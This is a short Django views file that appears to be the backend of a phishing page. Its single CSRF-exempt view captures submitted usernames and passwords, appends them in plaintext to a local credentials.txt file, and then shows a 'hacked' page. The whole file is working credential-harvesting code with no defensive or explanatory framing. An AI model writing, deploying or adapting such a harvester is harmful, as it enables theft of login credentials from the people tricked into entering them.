from django.shortcuts import render
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def index(request):
    if request.method == 'POST':
        email = request.POST.get('username')
        password = request.POST.get('password')
        
        # Save email and password to a text file
        with open('credentials.txt', 'a') as file:
            file.write(f'{email}:{password}\n')
        
        return render(request, 'hacked.html')

    return render(request, 'index.html')
